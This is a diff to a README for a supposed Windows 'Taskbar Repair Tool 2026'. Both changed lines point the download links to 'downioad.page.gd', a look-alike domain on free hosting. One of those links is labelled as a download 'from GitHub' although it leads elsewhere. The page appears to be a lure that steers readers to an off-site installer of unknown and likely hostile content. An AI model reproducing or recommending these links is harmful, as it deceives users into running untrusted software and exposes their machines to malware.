@@ -2,7 +2,7 @@
 
 Taskbar Repair Tool 2026 is a comprehensive solution designed to fix various issues with the Windows taskbar. Whether your taskbar is frozen, missing, or unresponsive, this tool provides a quick and efficient way to restore functionality on Windows 10 and 11. Built with user-friendliness in mind, it offers both novice and advanced users a reliable way to maintain their desktop environment.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -68,7 +68,7 @@ If you encounter any issues or have suggestions for improvement, please visit ou
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Disclaimer
 
